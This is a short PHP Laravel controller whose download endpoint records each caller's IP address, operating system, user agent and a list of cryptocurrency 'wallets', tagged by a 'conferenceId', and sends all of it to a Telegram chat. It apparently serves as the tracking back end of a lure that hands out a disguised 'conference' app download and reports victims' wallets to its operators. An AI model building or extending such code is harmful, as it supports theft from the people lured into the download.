<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Download;
use App\Services\TelegramService;
use Illuminate\Http\Request;

class NotifyController extends Controller
{
    public function download(Request $request)
    {
        $request->validate([
            'ua' => 'nullable|array',
            'wallets' => 'nullable|array',
            'tag' => 'nullable|string',
            'land' => 'nullable|string',
            'conferenceId' => 'nullable|string'
        ]);

        $platform = $this->detectPlatform($request->ua ?? []);
        $type = $request->conferenceId ? 'conference' : 'general';
        $reference = $request->conferenceId ?? 'general';

        Download::create([
            'type' => $type,
            'reference_id' => $reference,
            'platform' => $platform,
            'tag' => $request->tag,
            'user_agent' => json_encode($request->ua),
            'wallets' => $request->wallets ?? [],
            'ip_address' => $request->ip()
        ]);

        // Отправляем уведомление в Telegram
        $telegram = new TelegramService();
        $telegram->notifyDownload(
            $type,
            $reference,
            $platform,
            $request->ip(),
            json_encode($request->ua),
            $request->wallets ?? []
        );

        return response()->json([
            'success' => true,
            'message' => 'Notification sent'
        ]);
    }

    private function detectPlatform($userAgent)
    {
        if (isset($userAgent['os']['name'])) {
            return str_contains(strtolower($userAgent['os']['name']), 'mac') ? 'mac' : 'windows';
        }
        
        return 'unknown';
    }
}